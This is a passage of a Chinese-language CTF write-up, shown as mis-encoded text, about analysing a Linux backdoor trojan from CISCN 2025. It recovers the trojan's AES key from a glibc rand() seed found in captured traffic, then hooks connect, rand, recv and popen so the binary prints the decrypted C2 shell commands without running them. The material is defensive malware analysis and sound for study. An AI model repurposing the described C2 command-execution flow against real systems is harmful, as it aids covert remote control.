<p>è°ƒç”¨ srand(seed) åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼Œé€šè¿‡å¾ªç¯ <code>for ( i = 0; i &lt;= 3; ++i ) v8[i] = rand();</code> ç”Ÿæˆ 4 ä¸ªéšæœºæ•´æ•°ï¼Œä¸€å…±16ä¸ªå­—èŠ‚</p>
<p>è¿™é‡Œçš„ v8 æ•°ç»„å°±æ˜¯åç»­å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæ¯”å¦‚ AESä½¿ç”¨çš„åŸå§‹å¯†é’¥</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a65eedbe54f34f60a8bcd8831ccf6171~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=x3y%2FwUAYGyJvxZF0BsyjLXYD%2FoA%3D" alt="" loading="lazy"/></p>
<p>sub_13B4(v10, v8, 0LL)ï¼šä½¿ç”¨ v8 åˆå§‹åŒ–è§£å¯†çŠ¶æ€ï¼Œç”¨äºå¤„ç†æ”¶åˆ°çš„æŒ‡ä»¤</p>
<p>sub_13B4(v9, v8, 1LL)ï¼šä½¿ç”¨ v8 åˆå§‹åŒ–åŠ å¯†çŠ¶æ€ï¼Œç”¨äºåŠ å¯†è¿”å›çš„ç»“æœ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec3a6244bf1464782d8572c40515dc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=YyNqT4oBTYSTHYouOxcVkK%2B65R8%3D" alt="" loading="lazy"/></p>
<p>é¢˜ç›®è¦æ±‚æäº¤çš„æ˜¯æœ¨é©¬æ ·æœ¬é€šä¿¡ä½¿ç”¨çš„åŠ å¯†å¯†é’¥</p>
<p>æ ¹æ®ä»£ç ï¼Œå¯†é’¥æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¾èµ–äºæœåŠ¡å™¨å‘é€çš„ç¬¬ä¸€ä¸ª 4 å­—èŠ‚ç§å­</p>
<p>åœ¨æµé‡åŒ…ä¸­æ‰¾åˆ°ä¸ 192.168.1.201:58782 çš„ TCP æµ</p>
<p>æ‰¾åˆ° TCP ä¸‰æ¬¡æ¡æ‰‹ä¹‹åçš„ç¬¬ä¸€æ¡æ•°æ®åŒ…ï¼Œç”±æœåŠ¡å™¨å‘å¾€æœ¨é©¬å®¢æˆ·ç«¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c870d37f98f4deabd7b449ecd4ff9df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=zGAlqsvjBJZpWFreOuCT2z2Igl0%3D" alt="" loading="lazy"/></p>
<p>æå–è¿™å‰ 4 ä¸ªå­—èŠ‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e2287d2ac9f40c0995e244e4cff74fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=g6AusdzyFrDJtUNV2AJhfDdEC6I%3D" alt="" loading="lazy"/></p>
<p>å› ä¸ºç”±äºè¯¥æœ¨é©¬æ˜¯ ELF æ–‡ä»¶ï¼Œå®ƒè°ƒç”¨çš„ rand() å‡½æ•°éµå¾ªçš„æ˜¯ <strong>Linux glibc</strong> çš„éšæœºæ•°ç”Ÿæˆç®—æ³•</p>
<p>Python è‡ªå¸¦çš„ random åº“ä½¿ç”¨çš„æ˜¯ Mersenne Twister ç®—æ³•ï¼Œä¸ C è¯­è¨€çš„ rand() å®Œå…¨ä¸åŒ</p>
<p>å› æ­¤ï¼ŒPython è„šæœ¬å¿…é¡»é€šè¿‡ ctypes åº“è°ƒç”¨ Linux ç³»ç»Ÿçš„æ ‡å‡† C åº“ï¼ˆlibc.so.6ï¼‰æ¥è·å–ä¸€è‡´çš„ç»“æœ</p>
<p>ä½†æ˜¯æˆ‘æäº†å¥½ä¹…ä¹Ÿæ²¡æœ‰æå®šï¼Œæœ€åå†³å®šç›´æ¥ç”¨Cè¯­è¨€å†™å¾—äº†</p>
<pre><code class="hljs language-sql" lang="sql">#include <span class="hljs-operator">&lt;</span>stdio.h<span class="hljs-operator">&gt;</span>#include <span class="hljs-operator">&lt;</span>stdlib.h<span class="hljs-operator">&gt;</span>#include <span class="hljs-operator">&lt;</span>stdint.h<span class="hljs-operator">&gt;</span><span class="hljs-type">int</span> main() {    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>  <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x46</span>    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> åœ¨å°ç«¯åºæœºå™¨ä¸Šï¼Œè¿™ <span class="hljs-number">4</span> ä¸ªå­—èŠ‚ç»„æˆçš„ <span class="hljs-type">int</span> v7 <span class="hljs-operator">=</span> <span class="hljs-number">0x46209534</span>    uint32_t v7 <span class="hljs-operator">=</span> <span class="hljs-number">0x46209534</span>;     <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">2.</span> æ¨¡æ‹Ÿ IDA ä¸­çš„å­—èŠ‚åºè½¬æ¢é€»è¾‘    uint32_t seed <span class="hljs-operator">=</span> ((v7 <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF00</span>) <span class="hljs-operator">|</span>                     ((v7 <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF0000</span>) <span class="hljs-operator">|</span>                     (v7 <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">24</span>) <span class="hljs-operator">|</span>                     ((v7 <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">24</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>);     printf("[*] Calculated Seed: 0x%08x\n", seed);    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">3.</span> åˆå§‹åŒ–éšæœºæ•° (Linux ç¯å¢ƒä¸‹çš„ srand)    srand(seed);    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">4.</span> ç”Ÿæˆ <span class="hljs-number">16</span> å­—èŠ‚å¯†é’¥ v8    uint32_t v8[<span class="hljs-number">4</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i <span class="hljs-operator">&lt;=</span> <span class="hljs-number">3</span>; <span class="hljs-operator">+</span><span class="hljs-operator">+</span>i) {        v8[i] <span class="hljs-operator">=</span> rand();    }    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">5.</span> æŒ‰å†…å­˜é¡ºåºè¾“å‡º hex    unsigned <span class="hljs-type">char</span> <span class="hljs-operator">*</span>ptr <span class="hljs-operator">=</span> (unsigned <span class="hljs-type">char</span> <span class="hljs-operator">*</span>)v8;    printf("flag{");    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i <span class="hljs-operator">&lt;</span> <span class="hljs-number">16</span>; <span class="hljs-operator">+</span><span class="hljs-operator">+</span>i) {        printf("%02x", ptr[i]);    }    printf("}\n");    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
</code></pre>
<p>æ‰¾ä¸ªCè¯­è¨€åœ¨çº¿ç¼–è¯‘ç½‘å€å°±å¯ä»¥äº†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09aab5bb06a74b63bdaf534ee7e5911d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=hNbvhzb5UCZVZ449IIbvGZVBOD0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">6.SnakeBackdoor-6</h2>
<pre><code class="hljs">è¯·æäº¤æ”»å‡»è€…è·å–æœåŠ¡å™¨ä¸­çš„flagã€‚ç»“æœæäº¤å½¢å¼ï¼šflag{xxxx}
</code></pre>
<p>è¿™é‡Œå½“æ—¶æ²¡æœ‰è§£å‡ºæ¥ï¼Œåé¢å¬åˆ«çš„å¸ˆå‚…è¯´æ˜¯SM4åŠ å¯†ï¼Œåˆæ˜¯ä¸æ‡‚çš„ç©æ„ï¼Œæ¯”èµ›å®Œä½¿ç”¨hookè¿›è¡Œä¸€ä¸ªå¤ç°</p>
<p><strong>å‚è€ƒèµ„æ–™:<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aristore.top%2Fposts%2FCISCN2025Quals%2F%23SnakeBackdoor-6" target="_blank" title="https://www.aristore.top/posts/CISCN2025Quals/#SnakeBackdoor-6" ref="nofollow noopener noreferrer">www.aristore.top/posts/CISCNâ€¦</a></strong></p>
<p>åœ¨ä¸Šä¸€é¢˜main å‡½æ•°ä¸­ï¼Œå¯†æ–‡è¢«è§£å¯†åå­˜å…¥äº† command å˜é‡ï¼Œéšåç«‹å³æ‰§è¡Œäº† <code>popen(command, "r")</code></p>
<p>popen æ˜¯ä¸€ä¸ªæ ‡å‡†åº“å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å†™ä¸€ä¸ªè‡ªå·±çš„ popenï¼Œå½“æœ¨é©¬è°ƒç”¨å®ƒæ—¶ï¼Œç³»ç»Ÿè·‘çš„æ˜¯æˆ‘ä»¬è®¾è®¡å¥½çš„ä»£ç ï¼Œé‚£å°±å¯ä»¥åœ¨æˆ‘çš„ä»£ç é‡ŒæŠŠ command å‚æ•°æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥popen å°±æ˜¯æˆ‘ä»¬çš„æ³„å¯†ç‚¹</p>
<p>æƒ³è¦è®©ç¨‹åºè¿è¡Œåˆ° popen è¿™ä¸€æ­¥ï¼Œå‰é¢å¿…é¡»æ»¡è¶³ä¸€ç³»åˆ—æ¡ä»¶</p>
<p>é¦–å…ˆï¼Œè¿æ¥å¿…é¡»æˆåŠŸï¼šç¨‹åºé‡Œæœ‰ <code>if (connect(...) &lt; 0) exit(1)</code></p>
<p>é‚£æˆ‘ä»¬ä¼ªé€  connectï¼Œè®©å®ƒæ°¸è¿œè¿”å› 0</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10478669305843948ccd2946bd9cbd09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=zlrYnIHvzFhJDtodiz3LugX9iMk%3D" alt="" loading="lazy"/></p>
<p>å…¶æ¬¡ï¼Œå¯†é’¥å¿…é¡»æ­£ç¡®ï¼Œç¨‹åºç”¨ rand() ç”Ÿæˆå¯†é’¥</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±åŠ«æŒ rand()ï¼Œä¸ç®¡ç¨‹åºæ€ä¹ˆç®—ï¼Œéƒ½è®©å®ƒåå‡ºä¸Šä¸€é¢˜é‚£ä¸ªac46fb610b313b4f32fc642d8834b456å¯†é’¥</p>
<p>æ¥ç€å¿…é¡»æœ‰æ•°æ®è¾“å…¥ï¼Œç¨‹åºç”¨ sub_18EDï¼Œåº•å±‚è°ƒç”¨ recvï¼Œä»ç½‘ç»œè¯»æŒ‡ä»¤</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff46bcfcab4427f9e7ca15301df1099~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=5YcsIgU4QjROW5i7UBEDNRiBsIg%3D" alt="" loading="lazy"/></p>
<p>æ‰€ä»¥è¦åŠ«æŒ recvï¼Œå½“ç¨‹åºè¦è¯»æ•°æ®æ—¶ï¼ŒæŠŠæµé‡åŒ…é‡Œçš„åå…­è¿›åˆ¶å¯†æ–‡å¡ç»™å®ƒ</p>
<p>æ‰€ä»¥æ•´ä¸ªæ¶æ„è½¯ä»¶çš„è¿è¡Œé€»è¾‘å°±æ˜¯</p>
<pre><code class="hljs language-scss" lang="scss">è¿æ¥C2æœåŠ¡å™¨ (connect) â†’ ç”ŸæˆåŠ å¯†å¯†é’¥ (rand Ã— <span class="hljs-number">4</span>) â†’ æ¥æ”¶å¯†æ–‡é•¿åº¦ (recv) â†’ æ¥æ”¶å¯†æ–‡æ•°æ® (recv) â†’ è§£å¯†å‘½ä»¤ (å†…éƒ¨è§£å¯†å‡½æ•°) â†’ æ‰§è¡Œå‘½ä»¤ (popen) â†’ å›ä¼ ç»“æœ (send)
</code></pre>
<p>é¦–å…ˆç”±äºåç»­æ“ä½œä¸­éœ€è¦å¤„ç†å¤§é‡åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªè¾…åŠ©å‡½æ•°å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—èŠ‚æµ</p>
<p>è¿™ä¸ªå‡½æ•°æ˜¯æ•´ä¸ª Hook ä»£ç çš„åŸºç¡€è®¾æ–½ï¼Œå…¶ä»–æ‰€æœ‰å‡½æ•°éƒ½ä¼šä¾èµ–å®ƒæ¥è¿›è¡Œæ•°æ®æ ¼å¼è½¬æ¢</p>
<pre><code class="hljs language-python" lang="python">// åå…­è¿›åˆ¶è½¬äºŒè¿›åˆ¶void hex_to_bin(const char *<span class="hljs-built_in">hex</span>, unsigned char *<span class="hljs-built_in">bin</span>) {    size_t <span class="hljs-built_in">len</span> = strlen(<span class="hljs-built_in">hex</span>);    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>; i += <span class="hljs-number">2</span>) {        sscanf(<span class="hljs-built_in">hex</span> + i, <span class="hljs-string">"%2hhx"</span>, &amp;<span class="hljs-built_in">bin</span>[i / <span class="hljs-number">2</span>]);    }}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°çš„å®ç°åŸç†éå¸¸ç›´æ¥ï¼Œéå†è¾“å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ¯ä¸¤ä¸ªå­—ç¬¦ç»„æˆä¸€ä¸ªå­—èŠ‚ï¼Œä½¿ç”¨ <code>sscanf</code> çš„ <code>%2hhx</code> æ ¼å¼è¯´æ˜ç¬¦å°†å…¶è§£æä¸ºä¸€ä¸ªå­—èŠ‚å€¼ï¼Œå¹¶å­˜å‚¨åˆ°ç›®æ ‡ç¼“å†²åŒºä¸­</p>
<p>ä¾‹å¦‚ï¼Œåå…­è¿›åˆ¶å­—ç¬¦ä¸² "ac46fb61" ä¼šè¢«è½¬æ¢ä¸ºå­—èŠ‚åºåˆ— [0xac, 0x46, 0xfb, 0x61]</p>
<p>ç„¶åå°±æ˜¯connectï¼Œè®©å…¶return 0å°±å¯ä»¥äº†</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> len)</span> </span>{    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
</code></pre>
<p>æ¥ç€ï¼Œç¨‹åºä½¿ç”¨ ä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥åŠ¨æ€ç”ŸæˆåŠ å¯†å¯†é’¥</p>
<p>å…·ä½“æ¥è¯´ï¼Œç¨‹åºé¦–å…ˆä» C2 æœåŠ¡å™¨æ¥æ”¶ä¸€ä¸ª 4 å­—èŠ‚çš„ç§å­å€¼ï¼Œç„¶åç”¨è¿™ä¸ªç§å­åˆå§‹åŒ– <code>srand()</code>ï¼Œæ¥ç€è¿ç»­è°ƒç”¨ 4 æ¬¡ <code>rand()</code> ç”Ÿæˆ 4 ä¸ª 32 ä½æ•´æ•°ï¼Œè¿™ 16 å­—èŠ‚çš„æ•°æ®å°±æ˜¯åŠ å¯†å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€é¢˜å¾—åˆ°çš„flag<code>ac46fb610b313b4f32fc642d8834b456</code>ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©ç¨‹åºåœ¨è°ƒç”¨ <code>rand()</code> æ—¶è¿”å›è¿™ä¸ªé¢„å®šä¹‰å¯†é’¥çš„å„ä¸ªéƒ¨åˆ†</p>
<p>é‚£ä¹ˆä½¿ç”¨é™æ€å˜é‡ <code>key_bin</code> å­˜å‚¨åå…­è¿›åˆ¶å¯†é’¥çš„äºŒè¿›åˆ¶å½¢å¼ï¼Œ<code>rand_call_count</code> è·Ÿè¸ª <code>rand()</code> çš„è°ƒç”¨æ¬¡æ•°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶å°†åå…­è¿›åˆ¶å¯†é’¥è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œåç»­æ¯æ¬¡è°ƒç”¨æ—¶å–å‡º 4 å­—èŠ‚æ•°æ®ä½œä¸º <code>unsigned int</code> è¿”å›</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *KEY_HEX = <span class="hljs-string">"ac46fb610b313b4f32fc642d8834b456"</span>;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rand</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{       <span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key_bin[<span class="hljs-number">16</span>];    <span class="hljs-type">static</span> <span class="hljs-type">int</span> rand_call_count = <span class="hljs-number">0</span>;    <span class="hljs-type">static</span> <span class="hljs-type">int</span> inited = <span class="hljs-number">0</span>;    <span class="hljs-comment">// è½¬äºŒè¿›åˆ¶    if (!inited) {        hex_to_bin(KEY_HEX, key_bin);        inited = 1;    }    // æ¯æ¬¡è°ƒç”¨å–å‡º 4 å­—èŠ‚ä½œä¸ºä¸€ä¸ªæ•´æ•°è¿”å›ç»™ v8[i]    if (rand_call_count &lt; 4) {        unsigned int val = *(unsigned int *)&amp;key_bin[rand_call_count * 4];        rand_call_count++;        return val;    }    return 0;}</span>
</code></pre>
<p>ç„¶åç¨‹åºé€šè¿‡ <code>recv()</code> ç³»ç»Ÿè°ƒç”¨ä» C2 æœåŠ¡å™¨æ¥æ”¶æ•°æ®</p>
<p>è¿™é‡Œæ¥æ”¶è¿‡ç¨‹åˆ†ä¸ºä¸¤æ­¥ï¼Œé¦–å…ˆæ¥æ”¶ 4 å­—èŠ‚çš„å¯†æ–‡é•¿åº¦ï¼Œç„¶åæ¥æ”¶å¯¹åº”é•¿åº¦çš„å¯†æ–‡æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šé‡å¤å¤šæ¬¡ï¼Œæ¯ä¸€å¯¹é•¿åº¦ï¼Œæ•°æ®ä»£è¡¨ä¸€æ¡åŠ å¯†å‘½ä»¤</p>
<p>è¿™äº›å¯†æ–‡æ•°æ®æ¥è‡ªæµé‡åŒ…ä¸­çš„å®é™…é€šä¿¡è®°å½•ï¼Œé€šè¿‡ Wireshark è¿½è¸ªæµ 1827ï¼Œå¯ä»¥è·å–å®Œæ•´çš„å¯†æ–‡é•¿åº¦å’Œå¯†æ–‡åºåˆ—ï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€é¢˜è¿½è¸ªåˆ°çš„é‚£äº›ï¼Œè¿™äº›æ•°æ®è¢«ç»„ç»‡æˆä¸€ä¸ª <code>DATA</code> æ•°ç»„ï¼Œæ¯ä¸¤ä¸ªå…ƒç´ ä¸ºä¸€ç»„ï¼šç¬¬ä¸€ä¸ªæ˜¯å¯†æ–‡é•¿åº¦çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œç¬¬äºŒä¸ªæ˜¯å¯¹åº”çš„å¯†æ–‡</p>
<p>å¯ä»¥ä½¿ç”¨ <code>recv_step</code> é™æ€å˜é‡è®°å½• <code>recv()</code> çš„è°ƒç”¨æ¬¡æ•°ï¼Œæ ¹æ®è°ƒç”¨æ¬¡æ•°çš„å¥‡å¶æ€§æ¥å†³å®šè¿”å›é•¿åº¦è¿˜æ˜¯æ•°æ®</p>
<p>ç¬¬ä¸€æ¬¡è°ƒç”¨è¿”å›ä»»æ„ 4 å­—èŠ‚ä½œä¸ºæ¡æ‰‹åŒ…ï¼›å¥‡æ•°æ¬¡è°ƒç”¨ï¼ˆ1ã€3ã€5...ï¼‰è¿”å›å½“å‰å¯†æ–‡çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯éœ€è¦è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºï¼›å¶æ•°æ¬¡è°ƒç”¨ï¼ˆ2ã€4ã€6...ï¼‰è¿”å›å¯¹åº”çš„å¯†æ–‡æ•°æ®</p>
<pre><code class="hljs language-perl" lang="perl">const char *DATA[] = {    <span class="hljs-string">"00000010"</span>, <span class="hljs-string">"49b351855f211b85bd012f80ce8ed5b3"</span>,    <span class="hljs-string">"00000010"</span>, <span class="hljs-string">"2cc5becb37ca595a89445461c6512efc"</span>,    <span class="hljs-string">"00000010"</span>, <span class="hljs-string">"b863696da0c6bb28da46e09069dd644f"</span>,    <span class="hljs-string">"00000030"</span>, <span class="hljs-string">"87e8faa921f3e67c530f1b6740a9d439..."</span>,    <span class="hljs-regexp">//</span> ... æ›´å¤šå¯†æ–‡æ•°æ® ...    NULL  // ç»“æŸæ ‡è®°};ssize_t <span class="hljs-keyword">recv</span>(<span class="hljs-keyword">int</span> sockfd, void *buf, size_t len, <span class="hljs-keyword">int</span> flags) {    static <span class="hljs-keyword">int</span> recv_step = <span class="hljs-number">0</span>;           <span class="hljs-regexp">//</span> è®°å½•è°ƒç”¨æ¬¡æ•°    static unsigned <span class="hljs-keyword">int</span> current_len = <span class="hljs-number">0</span>; <span class="hljs-regexp">//</span> å½“å‰å¯†æ–‡é•¿åº¦    // æ¡æ‰‹åŒ…    <span class="hljs-keyword">if</span> (recv_step == <span class="hljs-number">0</span>) {        memset(buf, <span class="hljs-number">0x41</span>, <span class="hljs-number">4</span>);          recv_step++;        <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;    }    <span class="hljs-keyword">int</span> idx = recv_step - <span class="hljs-number">1</span>;    <span class="hljs-keyword">if</span> (DATA[idx] == NULL) {        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);    }    // é•¿åº¦ï¼ˆå¥‡æ•°æ¬¡è°ƒç”¨ï¼‰    <span class="hljs-keyword">if</span> (recv_step % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) {        sscanf(DATA[idx], <span class="hljs-string">"%x"</span>, &amp;current_len);        <span class="hljs-regexp">//</span> åˆ›å»º<span class="hljs-number">4</span>å­—èŠ‚ç¼“å†²åŒºå­˜å‚¨é•¿åº¦å€¼        unsigned char len_buf[<span class="hljs-number">4</span>];        <span class="hljs-regexp">//</span> æ„é€ ç½‘ç»œå­—èŠ‚åºï¼ˆå¤§ç«¯åºï¼‰        len_buf[<span class="hljs-number">0</span>] = (current_len &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;  <span class="hljs-regexp">//</span> MSB        len_buf[<span class="hljs-number">1</span>] = (current_len &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;        len_buf[<span class="hljs-number">2</span>] = (current_len &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;        len_buf[<span class="hljs-number">3</span>] = current_len &amp; <span class="hljs-number">0xFF</span>;          <span class="hljs-regexp">//</span> LSB        memcpy(buf, len_buf, <span class="hljs-number">4</span>);        recv_step++;        <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;    }    // å¯†æ–‡ï¼ˆå¶æ•°æ¬¡è°ƒç”¨ï¼‰    <span class="hljs-keyword">if</span> (recv_step % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {        unsigned char *cipher_bin = (unsigned char *)malloc(current_len);        hex_to_bin(DATA[idx], cipher_bin);        <span class="hljs-regexp">//</span> å°†äºŒè¿›åˆ¶å¯†æ–‡æ•°æ®å¤åˆ¶åˆ°ç¼“å†²åŒº        memcpy(buf, cipher_bin, current_len);        <span class="hljs-regexp">//</span> é‡Šæ”¾ä¸´æ—¶åˆ†é…çš„å†…å­˜        free(cipher_bin);        recv_step++;        <span class="hljs-keyword">return</span> current_len;    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
</code></pre>
<p>ç¨‹åºè§£å¯†å‘½ä»¤åï¼Œä¼šä½¿ç”¨ <code>popen()</code> å‡½æ•°æ‰§è¡Œè§£å¯†åçš„ shell å‘½ä»¤</p>
<p>è¿™æ˜¯æ•´ä¸ªæ”»å‡»é“¾çš„ç»ˆç‚¹ï¼Œç°åœ¨è¦æ‰§è¡Œäº†ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œå‰å°†å…¶æ‰“å°å‡ºæ¥ï¼Œè¿™æ ·å°±èƒ½è·å–æ˜æ–‡å†…å®¹ã€‚</p>
<p>é€šè¿‡ Hook <code>popen()</code> å‡½æ•°ï¼Œåœ¨å®ƒè¢«è°ƒç”¨æ—¶æ‰“å°ä¼ å…¥çš„ <code>command</code> å‚æ•°ï¼Œç„¶åè¿”å›ä¸€ä¸ªåˆæ³•çš„æ–‡ä»¶æŒ‡é’ˆï¼ˆæŒ‡å‘ <code>/dev/null</code>ï¼‰ï¼Œè®©ç¨‹åºä»¥ä¸ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function">FILE *<span class="hljs-title">popen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *type)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, command);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"/dev/null"</span>, <span class="hljs-string">"r"</span>);}
</code></pre>
<p>ä¸ºäº†è®©ç¨‹åºç¨³å®šè¿è¡Œè€Œä¸å´©æºƒï¼Œè¿˜éœ€è¦å¤„ç†ä¸¤ä¸ªé¢å¤–çš„å‡½æ•°</p>
<p>å› ä¸ºåœ¨ <code>popen()</code> ä¸­è¿”å›çš„æ˜¯ <code>/dev/null</code> çš„æ™®é€šæ–‡ä»¶æµï¼Œè€Œä¸æ˜¯çœŸæ­£çš„è¿›ç¨‹ç®¡é“</p>
<p>å½“ç¨‹åºåç»­è°ƒç”¨ <code>pclose()</code> å°è¯•å…³é—­è¿™ä¸ªå‡ç®¡é“æ—¶ï¼Œæˆ–è€…è°ƒç”¨ <code>send()</code> é€šè¿‡æ— æ•ˆçš„ Socket å›ä¼ ç»“æœæ—¶ï¼Œç¨‹åºä¼šæŠ¥é”™é€€å‡º</p>
<p><strong>Hook pclose()</strong>ï¼šå½“ç¨‹åºå°è¯•å…³é—­ä¸å­˜åœ¨çš„ç®¡é“æ—¶ï¼Œç›´æ¥è¿”å›æˆåŠŸå³å¯</p>
<p><strong>Hook send()</strong>ï¼šå½“ç¨‹åºå°è¯•é€šè¿‡ Socket å‘é€æ•°æ®æ—¶ï¼Œç›´æ¥è¿”å›å‘é€é•¿åº¦ï¼Œè¡¨ç¤ºå‘é€æˆåŠŸï¼Œä½†ä¸çœŸæ­£æ‰§è¡Œä»»ä½•ç½‘ç»œæ“ä½œ</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pclose</span><span class="hljs-params">(FILE *stream)</span> </span>{    <span class="hljs-keyword">if</span> (stream) <span class="hljs-built_in">fclose</span>(stream);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">send</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> flags)</span> </span>{    <span class="hljs-keyword">return</span> len;}
</code></pre>
<p>æ‰€ä»¥æœ€ç»ˆçš„hook.cä»£ç å°±æ˜¯æŠŠä¸Šè¿°çš„éƒ½æ‹¼åœ¨ä¸€èµ·å³å¯</p>
